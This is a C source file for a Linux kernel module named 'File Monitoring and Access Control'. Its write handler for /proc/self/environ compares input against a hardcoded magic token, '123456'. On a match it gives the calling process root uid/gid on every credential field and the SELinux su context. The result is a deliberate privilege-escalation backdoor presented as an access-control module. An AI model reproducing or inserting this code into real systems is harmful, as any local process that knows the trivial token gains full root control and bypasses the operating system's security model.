// SPDX-License-Identifier: GPL-3.0-or-later
/* FMAC - File Monitoring and Access Control Kernel Module
 * Copyright (C) 2025 Aqnya
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 */

#include <linux/cred.h>
#include <linux/uaccess.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/selinux.h>
#include <linux/security.h>

#define MAGIC_TOKEN "123456"


#include "objsec.h"
#include "fmac.h"

static int elevate_to_root(void)
{
    struct cred *cred;
    u32 sid = 0;
    int err;

    // 获取 su 的 SELinux SID（可选）
    err = security_secctx_to_secid("u:r:su:s0", strlen("u:r:su:s0"), &sid);
    if (err) {
        fmac_append_to_log("[FMAC] Failed to get SELinux SID: %d\n", err);
        return -EINVAL;
    }

    cred = prepare_creds();
    if (!cred) {
        fmac_append_to_log("[FMAC] Failed to prepare credentials\n");
        return -ENOMEM;
    }

    // 设置 root 身份
    cred->uid.val   = 0;
    cred->gid.val   = 0;
    cred->euid.val  = 0;
    cred->egid.val  = 0;
    cred->suid.val  = 0;
    cred->sgid.val  = 0;
    cred->fsuid.val = 0;
    cred->fsgid.val = 0;

    // 设置 SELinux SID（如可用）
    ((struct task_security_struct *)cred->security)->sid = sid;

    return commit_creds(cred);
}


ssize_t fmac_environ_write(struct file *file, const char __user *buf,
                           size_t count, loff_t *ppos)
{
    char kbuf[64] = {0};

    if (count >= sizeof(kbuf))
        return -EINVAL;

    if (copy_from_user(kbuf, buf, count))
        return -EFAULT;

    kbuf[count] = '\0';


    if (memcmp(kbuf, MAGIC_TOKEN,6) == 0) {
        elevate_to_root();
        fmac_append_to_log("[FMAC] root triggered via /proc/self/environ\n");
    }

    return count;
}